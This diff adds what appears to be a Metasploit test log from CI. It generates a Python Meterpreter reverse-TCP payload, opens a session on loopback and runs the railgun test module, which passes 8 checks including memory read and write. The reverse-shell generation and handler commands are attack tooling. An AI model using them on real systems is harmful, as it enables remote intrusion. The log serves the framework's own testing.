@@ -1,0 +1,29 @@
+use python/meterpreter/reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220129-5416-1622naz.py -f raw MeterpreterTryToFork=false lport=6015 lhost=127.0.0.1
+msf6 payload(python/meterpreter/reverse_tcp) > [*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220129-5416-1622naz.py...
+msf6 payload(python/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 14
+msf6 payload(python/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6015 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 15 opened (127.0.0.1:6015 -> 127.0.0.1:50104 ) at 2022-01-29 22:57:33 +0000
+use test/railgun
+msf6 post(test/railgun) > run session=15 addentropy=true verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 15
+[*] Session type is meterpreter and platform is windows
+[+] Should retrieve the win32k file version
+[+] Should include error information in the results
+[+] Should support functions with no parameters
+[+] Should support functions with literal parameters
+[+] Should support functions with in/out/inout parameter types
+[+] Should support calling multiple functions at once
+[+] Should support writing memory
+[+] Should support reading memory
+[*] Testing complete in 0.2746168
+[*] Passed: 8; Failed: 0
+[*] Post module execution completed
+msf6 post(test/railgun) > 
